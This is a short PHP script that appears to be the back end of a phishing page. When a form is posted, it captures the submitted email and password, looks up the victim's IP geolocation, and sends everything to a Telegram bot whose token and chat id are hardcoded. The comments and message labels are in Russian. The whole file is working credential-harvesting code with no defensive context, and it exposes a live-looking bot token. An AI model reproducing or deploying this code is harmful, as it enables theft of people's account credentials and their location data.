<?php
if ($_SERVER['REQUEST_METHOD'] != 'POST') {
    exit();
}

$token = "6723014367:AAFscjMGAwDZ8NfIRiNJavsz9_1acmHZ92w";
$chat_id = "-4092028418";

$ch = curl_init('http://ip-api.com/json/' . $_SERVER['REMOTE_ADDR'] . '?lang=ru');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_HEADER, false);
$res = curl_exec($ch);
curl_close($ch);
 
$res = json_decode($res, true);

var_dump($_POST);
if ( ! empty( $_POST ) ) {
    $name  = htmlspecialchars($_POST['mail']);
    $phone  = htmlspecialchars($_POST['pass']);

    //Тело сообщения для отправки в телеграмм
    $txt = "Почта: $name %0A";
    $txt .= "Пароль: $phone %0A";
    $txt .= "IP: $res[query] %0A";
    $txt .= "Страна: $res[сountry] %0A";
    $txt .= "Код страны: $res[countryCode] %0A";
    $txt .= "Город: $res[city] %0A";

    try {
        //Передаем сообщение в телеграмм
        $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
        die();

    } catch (Exception $e) {
    }
} else {
}
?>